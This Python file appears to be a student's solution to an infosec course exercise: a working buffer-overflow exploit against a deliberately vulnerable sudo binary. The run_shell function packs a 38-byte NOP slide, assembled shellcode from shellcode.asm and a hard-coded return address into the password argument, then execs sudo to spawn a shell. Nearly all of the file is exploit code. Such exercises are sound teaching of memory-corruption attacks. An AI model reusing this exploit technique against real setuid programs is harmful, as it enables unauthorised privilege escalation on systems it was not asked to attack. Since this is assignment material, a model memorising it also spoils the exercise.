import os
import sys
from infosec.utils import assemble


def run_shell(path_to_sudo: str):
    """
    Exploit the vulnerable sudo program to open an interactive shell.

    The assembly code of the shellcode should be saved in `shellcode.asm`, use
    the `assemble` module to translate the assembly to bytes.

    WARNINGS:
    1. As before, use `path_to_sudo` and don't hard-code the path.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/3/q2/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.utils import assemble; help(assemble)'
    2. As before, prefer using `os.execl` over `os.system`.

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
       
    # nop slide
    password = 38 * b'\x90'
    
    # shellcode
    path_to_py = os.path.abspath(__file__)
    path_to_dir = os.path.dirname(path_to_py)
    path_to_patch = os.path.join(path_to_dir, "shellcode.asm")
    shellcode = assemble.assemble_file(path_to_patch)
    password += shellcode
    
    # ra
    password += b'\x58\xe0\xff\xbf'

    os.execl(path_to_sudo, path_to_sudo, password , "whoami")   


def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    run_shell(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
